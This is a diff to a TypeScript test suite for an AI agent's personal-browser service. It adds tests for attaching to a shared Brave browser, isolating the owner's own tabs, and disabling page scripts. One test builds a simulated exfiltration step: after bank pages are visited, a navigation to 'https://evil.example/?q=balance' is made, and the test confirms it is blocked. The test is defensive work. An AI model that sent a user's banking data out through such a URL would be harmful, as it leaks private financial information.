@@ -31,6 +31,7 @@ import * as Layer from "effect/Layer";
 import * as Logger from "effect/Logger";
 import * as Option from "effect/Option";
 import * as Queue from "effect/Queue";
+import * as Scope from "effect/Scope";
 import * as References from "effect/References";
 import * as Schema from "effect/Schema";
 import * as Stream from "effect/Stream";
@@ -67,6 +68,12 @@ import type {
   PageDialog,
   UnstickOutcome,
 } from "./driver.ts";
+import {
+  SharedAttachError,
+  sharedAttachSentence,
+  type BrowserBackendSetting,
+  type SharedAttachReason,
+} from "./browserBackend.ts";
 import * as PersonalBrowser from "./PersonalBrowser.ts";
 import * as PersonalBrowserLeaseRepository from "./PersonalBrowserLeaseRepository.ts";
 import * as PersonalBrowserProtectionRepository from "./PersonalBrowserProtectionRepository.ts";
@@ -207,7 +214,10 @@ class FakePage implements BrowserPage {
     return { width: 390, height: 844 };
   }
   async setColorScheme() {}
-  async bringToFront() {}
+  fronted = 0;
+  async bringToFront() {
+    this.fronted++;
+  }
   mouseMoveFails = false;
   async mouseMove(x?: number, y?: number, steps?: number) {
     this.pointer.push({ op: "mouseMove", detail: [x, y, steps] });
@@ -337,8 +347,35 @@ const makeFakeDriver = () => {
     crash: () => {},
     /** Like the real driver, `close()` then fires the close listener too. */
     closeFiresListener: false,
+    attaches: 0,
+    detaches: 0,
+    attachedTo: null as string | null,
+    attachError: null as SharedAttachError | null,
   };
   const driver: BrowserDriver = {
+    attach: async (attachOptions) => {
+      state.attaches++;
+      state.attachedTo = attachOptions.userDataDir;
+      if (state.attachError !== null) throw state.attachError;
+      const opened = new Set<FakePage>();
+      return {
+        pages: () => pages.filter((candidate) => !candidate.closed),
+        newPage: async () => {
+          const created = new FakePage();
+          state.onNewPage?.(created);
+          pages.push(created);
+          opened.add(created);
+          return created;
+        },
+        onClose: (listener) => {
+          state.crash = listener;
+        },
+        detach: async () => {
+          state.detaches++;
+          for (const page of opened) page.closed = true;
+        },
+      };
+    },
     launch: async () => {
       state.launches++;
       return {
@@ -466,6 +503,7 @@ const baseLayer = <RepositoryError, RepositoryContext, ProtectionContext>(
     readonly streamMaxFps?: number;
     readonly adaptiveJpeg?: boolean;
     readonly controlGraceMs?: number;
+    readonly backend?: BrowserBackendSetting;
   } = {},
 ) =>
   PersonalBrowser.makeLayer({
@@ -505,6 +543,7 @@ const makeLayer = (
     readonly streamMaxFps?: number;
     readonly adaptiveJpeg?: boolean;
     readonly controlGraceMs?: number;
+    readonly backend?: BrowserBackendSetting;
   },
 ) =>
   baseLayer(
@@ -1815,6 +1854,9 @@ describe("PersonalBrowser", () => {
       launch: async () => {
         throw new Error("no chrome");
       },
+      attach: async () => {
+        throw new Error("no chrome");
+      },
     };
     return Effect.gen(function* () {
       const browser = yield* PersonalBrowser.PersonalBrowser;
@@ -2283,6 +2325,8 @@ describe("PersonalBrowser", () => {
 
             // Back to the bot, still on the form: hidden again.
             yield* browser.returnToAgent("session-1");
+            yield* Effect.yieldNow;
+            yield* Effect.yieldNow;
             yield* drain(viewer);
             fillPage.paint();
             const again = yield* drain(viewer);
@@ -4062,6 +4106,28 @@ describe("PersonalBrowser", () => {
       }).pipe(Effect.provide(makeLayer(fake.driver, harness)));
     });
 
+    it.effect("pauses leaving a sensitive site that has no saved login", () => {
+      const fake = makeFakeDriver();
+      const harness: TaskHarness = { waits: [], resumes: [] };
+      return Effect.gen(function* () {
+        const sql = yield* SqlClient.SqlClient;
+        yield* sql`INSERT INTO personal_sensitive_sites (origin, label) VALUES (${BANK}, ${"Barclays"})`;
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: `${BANK}/accounts` }));
+        yield* browser.handleAutomationRequest(request("navigate", { url: `${BANK}/statements` }));
+
+        const exfil = request("navigate", { url: "https://evil.example/?q=balance" });
+        const paused = yield* refused(browser, exfil);
+        expect(paused.message).toContain("request_browser_help");
+        expect(paused.message).toContain("https://evil.example");
+        expect(fake.state.pages.flatMap((page) => page.gotos)).not.toContain(
+          "https://evil.example/?q=balance",
+        );
+        const help = yield* askHelp(browser);
+        expect(help).toMatchObject({ kind: "sensitive", sources: [BANK] });
+      }).pipe(Effect.provide(makeLayer(fake.driver, harness)));
+    });
+
     it.effect("Allow once lets one retry through, then the same step asks again", () => {
       const fake = makeFakeDriver();
       const harness: TaskHarness = { waits: [], resumes: [] };
@@ -4449,6 +4515,8 @@ describe("PersonalBrowser", () => {
               expect(page.viewports.at(-1)).toEqual(phone(320, 1_400));
 
               yield* browser.returnToAgent("session-1");
+              yield* Effect.yieldNow;
+              yield* Effect.yieldNow;
               // Exactly the agent's own preview_resize, not a cleared override.
               expect(page.viewports.at(-1)).toEqual({ width: 800, height: 600 });
               expect(yield* Queue.size(viewer.outbox)).toBe(0);
@@ -5523,6 +5591,378 @@ describe("preview automation host composition", () => {
     );
     expect(source).toContain("ServerBrowser.layerWithoutAutomationHost");
     expect(source).not.toContain("ServerBrowser.layer.pipe");
+  });
+
+  describe("page owners", () => {
+    const SHARED = { backend: { kind: "shared", userDataDir: "/unused" } } as const;
+    const foreignPage = () => {
+      const page = new FakePage();
+      page.currentUrl = "https://mail.example/inbox";
+      return page;
+    };
+
+    it.effect("shared: a new tab is a new page and the blank window page is left alone", () => {
+      const fake = makeFakeDriver();
+      const blank = fake.state.page;
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: "example.com" }));
+        expect(fake.state.pages).toHaveLength(2);
+        expect(blank.gotos).toEqual([]);
+        expect(fake.state.pages[1]!.gotos).toEqual(["https://example.com/"]);
+      }).pipe(Effect.provide(makeLayer(fake.driver, undefined, SHARED)));
+    });
+
+    it.effect("owned: the blank window page is still reused as before", () => {
+      const fake = makeFakeDriver();
+      const blank = fake.state.page;
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: "example.com" }));
+        expect(fake.state.pages).toHaveLength(1);
+        expect(blank.gotos).toEqual(["https://example.com/"]);
+      }).pipe(Effect.provide(makeLayer(fake.driver)));
+    });
+
+    const closedLastTab = (browser: PersonalBrowser.PersonalBrowser["Service"]) =>
+      Effect.gen(function* () {
+        const opened = yield* browser.handleAutomationRequest(
+          request("navigate", { url: "example.com" }),
+        );
+        yield* browser.handleAutomationRequest({
+          ...request("closeTab", {}),
+          tabId: (opened as { tabId: string }).tabId,
+          tabIdExplicit: true,
+        } as PreviewAutomationRequest);
+      });
+
+    it.effect("shared: with no bot tab open a viewer is shown none of the owner's pages", () => {
+      const fake = makeFakeDriver();
+      const mail = foreignPage();
+      fake.state.pages.splice(0, fake.state.pages.length, mail);
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* closedLastTab(browser);
+        yield* Effect.scoped(
+          Effect.gen(function* () {
+            yield* browser.attachViewer({ sessionId: "session-1", canOperate: true });
+            expect(mail.screencasts).toBe(0);
+          }),
+        );
+      }).pipe(Effect.provide(makeLayer(fake.driver, undefined, SHARED)));
+    });
+
+    it.effect("shared: once he takes control the viewer may fall back to his pages", () => {
+      const fake = makeFakeDriver();
+      const mail = foreignPage();
+      fake.state.pages.splice(0, fake.state.pages.length, mail);
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* closedLastTab(browser);
+        yield* Effect.scoped(
+          Effect.gen(function* () {
+            yield* browser.attachViewer({ sessionId: "session-1", canOperate: true });
+            yield* browser.takeControl("session-1");
+            expect(mail.screencasts).toBe(1);
+          }),
+        );
+      }).pipe(Effect.provide(makeLayer(fake.driver, undefined, SHARED)));
+    });
+
+    it.effect("shared: handing control back stops the stream of his page", () => {
+      const fake = makeFakeDriver();
+      const mail = foreignPage();
+      fake.state.pages.splice(0, fake.state.pages.length, mail);
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* closedLastTab(browser);
+        yield* Effect.scoped(
+          Effect.gen(function* () {
+            yield* browser.attachViewer({ sessionId: "session-1", canOperate: true });
+            yield* browser.takeControl("session-1");
+            expect(mail.screencasts).toBe(1);
+            yield* browser.returnToAgent("session-1");
+            expect(mail.stoppedScreencasts).toBe(1);
+          }),
+        );
+      }).pipe(Effect.provide(makeLayer(fake.driver, undefined, SHARED)));
+    });
+
+    it.effect("shared: a bot with no tab cannot act on a page the owner opened", () => {
+      const fake = makeFakeDriver();
+      const mail = foreignPage();
+      fake.state.pages.splice(0, fake.state.pages.length, mail);
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.status("session-1");
+        const error = yield* browser
+          .handleAutomationRequest(request("click", { locator: "text=Delete" }))
+          .pipe(Effect.flip);
+        expect(error.message).toBe("No open browser tab for this thread. Call preview_open first.");
+        expect(mail.closed).toBe(false);
+        expect(mail.gotos).toEqual([]);
+      }).pipe(Effect.provide(makeLayer(fake.driver, undefined, SHARED)));
+    });
+
+    it.effect("shared: releasing a thread closes its tab and leaves the owner's page open", () => {
+      const fake = makeFakeDriver();
+      const mail = foreignPage();
+      fake.state.pages.splice(0, fake.state.pages.length, mail);
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: "example.com" }));
+        const botPage = fake.state.pages[1]!;
+        yield* browser.releaseThread(threadId);
+        expect(botPage.closed).toBe(true);
+        expect(mail.closed).toBe(false);
+      }).pipe(Effect.provide(makeLayer(fake.driver, undefined, SHARED)));
+    });
+
+    it.effect("shared: switching the active tab never raises the window", () => {
+      const fake = makeFakeDriver();
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: "example.com" }));
+        yield* browser.handleAutomationRequest(
+          request("open", { url: "https://other.example/", reuseExistingTab: false }),
+        );
+        expect(fake.state.pages.map((page) => page.fronted)).toEqual([0, 0, 0]);
+      }).pipe(Effect.provide(makeLayer(fake.driver, undefined, SHARED)));
+    });
+
+    it.effect("owned: switching the active tab still raises it", () => {
+      const fake = makeFakeDriver();
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: "example.com" }));
+        yield* browser.handleAutomationRequest(
+          request("open", { url: "https://other.example/", reuseExistingTab: false }),
+        );
+        expect(fake.state.pages.map((page) => page.fronted).reduce((a, b) => a + b, 0)).toBe(2);
+      }).pipe(Effect.provide(makeLayer(fake.driver)));
+    });
+  });
+
+  describe("the shared backend", () => {
+    const SHARED = { backend: { kind: "shared", userDataDir: "/scratch/brave" } } as const;
+    const ownerPage = (fake: ReturnType<typeof makeFakeDriver>) => fake.state.page;
+
+    it.effect("attaches to the configured folder and never launches", () => {
+      const fake = makeFakeDriver();
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: "example.com" }));
+        expect(fake.state.attaches).toBe(1);
+        expect(fake.state.attachedTo).toBe("/scratch/brave");
+        expect(fake.state.launches).toBe(0);
+      }).pipe(Effect.provide(makeLayer(fake.driver, undefined, SHARED)));
+    });
+
+    it.effect("the default setting still launches its own browser and never attaches", () => {
+      const fake = makeFakeDriver();
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: "example.com" }));
+        expect(fake.state.launches).toBe(1);
+        expect(fake.state.attaches).toBe(0);
+      }).pipe(Effect.provide(makeLayer(fake.driver)));
+    });
+
+    it.effect("an explicit owned setting launches too", () => {
+      const fake = makeFakeDriver();
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: "example.com" }));
+        expect(fake.state.launches).toBe(1);
+        expect(fake.state.attaches).toBe(0);
+      }).pipe(Effect.provide(makeLayer(fake.driver, undefined, { backend: { kind: "owned" } })));
+    });
+
+    it.effect("the idle sweep detaches: bot pages close, his page and the browser stay", () => {
+      const fake = makeFakeDriver();
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: "example.com" }));
+        const botPage = fake.state.pages[1]!;
+        yield* TestClock.adjust("11 minutes");
+        expect((yield* browser.status("session-1")).state).toBe("offline");
+        expect(fake.state.detaches).toBe(1);
+        expect(botPage.closed).toBe(true);
+        expect(ownerPage(fake).closed).toBe(false);
+      }).pipe(Effect.provide(makeLayer(fake.driver, undefined, SHARED)));
+    });
+
+    it.effect("closing the browser from the app only detaches", () => {
+      const fake = makeFakeDriver();
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: "example.com" }));
+        yield* browser.closeBrowser({ sessionId: "session-1", byThreadId: null });
+        expect(fake.state.detaches).toBe(1);
+        expect(ownerPage(fake).closed).toBe(false);
+        expect((yield* browser.status("session-1")).state).toBe("offline");
+      }).pipe(Effect.provide(makeLayer(fake.driver, undefined, SHARED)));
+    });
+
+    it.effect("the server shutting down detaches", () => {
+      const fake = makeFakeDriver();
+      return Effect.gen(function* () {
+        const scope = yield* Scope.make();
+        const context = yield* Layer.buildWithScope(
+          makeLayer(fake.driver, undefined, SHARED),
+          scope,
+        );
+        yield* Effect.gen(function* () {
+          const browser = yield* PersonalBrowser.PersonalBrowser;
+          yield* browser.handleAutomationRequest(request("navigate", { url: "example.com" }));
+        }).pipe(Effect.provide(context));
+        expect(fake.state.detaches).toBe(0);
+        yield* Scope.close(scope, Exit.void);
+        expect(fake.state.detaches).toBe(1);
+        expect(ownerPage(fake).closed).toBe(false);
+      });
+    });
+
+    const reasons: ReadonlyArray<SharedAttachReason> = [
+      "brave-not-running",
+      "port-file-stale",
+      "wrong-browser",
+    ];
+    for (const reason of reasons) {
+      it.effect(`${reason} reaches the bot as its plain sentence, once, with no retry`, () => {
+        const fake = makeFakeDriver();
+        fake.state.attachError = new SharedAttachError({
+          reason,
+          message: sharedAttachSentence(reason),
+        });
+        return Effect.gen(function* () {
+          const browser = yield* PersonalBrowser.PersonalBrowser;
+          const error = yield* browser
+            .handleAutomationRequest(request("navigate", { url: "example.com" }))
+            .pipe(Effect.flip);
+          expect(error.message).toBe(sharedAttachSentence(reason));
+          expect(fake.state.attaches).toBe(1);
+          expect(fake.state.launches).toBe(0);
+          const status = yield* browser.status("session-1");
+          expect(status.detail).toBe(sharedAttachSentence(reason));
+        }).pipe(Effect.provide(makeLayer(fake.driver, undefined, SHARED)));
+      });
+    }
+
+    it.effect("Brave closing under an attached browser is reported, not restarted", () => {
+      const fake = makeFakeDriver();
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: "example.com" }));
+        fake.state.crash();
+        yield* awaitCondition(
+          Effect.map(browser.status("session-1"), (current) => current.state === "crashed"),
+        );
+        const status = yield* browser.status("session-1");
+        expect(status.state).toBe("crashed");
+        expect(status.detail).toBe("Brave is closed on the laptop. Ask Harout to open it.");
+        expect(fake.state.attaches).toBe(1);
+        expect(fake.state.launches).toBe(0);
+      }).pipe(Effect.provide(makeLayer(fake.driver, undefined, SHARED)));
+    });
+
+    it.effect("refuses page scripts on every site and reads the shared protection profile", () => {
+      const fake = makeFakeDriver();
+      const loaded: string[] = [];
+      const protections = Layer.succeed(
+        PersonalBrowserProtectionRepository.PersonalBrowserProtectionRepository,
+        PersonalBrowserProtectionRepository.PersonalBrowserProtectionRepository.of({
+          load: (profileId) =>
+            Effect.sync(() => {
+              loaded.push(profileId);
+              return Option.none();
+            }),
+          save: () => Effect.void,
+        }),
+      );
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(
+          request("navigate", { url: "https://example.com/" }),
+        );
+        const scripted = yield* browser
+          .handleAutomationRequest(request("evaluate", { expression: "1 + 1" }))
+          .pipe(Effect.flip);
+        expect(scripted.message).toContain("Page scripts are disabled");
+        expect(loaded).toEqual(["shared"]);
+      }).pipe(
+        Effect.provide(
+          baseLayer(
+            fake.driver,
+            PersonalBrowserLeaseRepository.layer,
+            protections,
+            undefined,
+            undefined,
+            SHARED,
+          ),
+        ),
+      );
+    });
+
+    it.effect("the owned profile keeps its own protection id and may run scripts", () => {
+      const fake = makeFakeDriver();
+      const loaded: string[] = [];
+      const protections = Layer.succeed(
+        PersonalBrowserProtectionRepository.PersonalBrowserProtectionRepository,
+        PersonalBrowserProtectionRepository.PersonalBrowserProtectionRepository.of({
+          load: (profileId) =>
+            Effect.sync(() => {
+              loaded.push(profileId);
+              return Option.none();
+            }),
+          save: () => Effect.void,
+        }),
+      );
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(
+          request("navigate", { url: "https://example.com/" }),
+        );
+        yield* browser.handleAutomationRequest(request("evaluate", { expression: "1 + 1" }));
+        expect(loaded).toEqual(["default"]);
+      }).pipe(
+        Effect.provide(baseLayer(fake.driver, PersonalBrowserLeaseRepository.layer, protections)),
+      );
+    });
+  });
+
+  describe("an imported profile folder", () => {
+    it.effect("is refused before a launch and its stale singleton lock is left alone", () => {
+      const baseDir = NodeFS.mkdtempSync(NodePath.join(NodeOS.tmpdir(), "t3-browser-marker-"));
+      const profileDir = NodePath.join(baseDir, "personal", "browser-profiles", "default");
+      NodeFS.mkdirSync(profileDir, { recursive: true });
+      NodeFS.writeFileSync(NodePath.join(profileDir, "hbots-import.json"), "{}\n");
+      NodeFS.symlinkSync("somehost-2147483646", NodePath.join(profileDir, "SingletonLock"));
+      const fake = makeFakeDriver();
+      return Effect.gen(function* () {
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        const error = yield* browser
+          .handleAutomationRequest(request("navigate", { url: "example.com" }))
+          .pipe(Effect.flip);
+        expect(error.message).toBe(
+          `This browser folder was imported from a real browser and must not be launched by hbots: ${profileDir} holds hbots-import.json. Use the shared browser setting, or point hbots at a different folder.`,
+        );
+        expect(fake.state.launches).toBe(0);
+        expect(NodeFS.lstatSync(NodePath.join(profileDir, "SingletonLock")).isSymbolicLink()).toBe(
+          true,
+        );
+      }).pipe(
+        Effect.provide(
+          baseLayer(
+            fake.driver,
+            PersonalBrowserLeaseRepository.layer,
+            PersonalBrowserProtectionRepository.layer,
+            undefined,
+            baseDir,
+          ),
+        ),
+      );
+    });
   });
 
   it.effect("a preview open from a thread reaches the personal browser and takes its lease", () => {
